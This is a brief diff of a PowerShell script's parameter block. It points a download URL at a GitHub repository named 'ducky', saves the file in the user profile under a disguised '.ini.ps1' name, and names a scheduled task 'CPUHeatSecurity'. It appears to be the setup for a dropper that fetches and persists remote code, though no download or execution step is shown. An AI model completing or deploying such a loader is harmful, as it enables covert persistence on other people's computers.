@@ -1,5 +1,5 @@
 # Paramètres
-$githubUrl = "https://raw.githubusercontent.com/NomUtilisateur/NomRepo/master/CPUHeatSecurity.ps1"
+$githubUrl = "https://raw.githubusercontent.com/Gamoboy/ducky/master/CPUHeatSecurity.ps1"
 $destinationPath = "$env:USERPROFILE\CPUHeatSecurity.ini.ps1"
 $taskName = "CPUHeatSecurity"
 
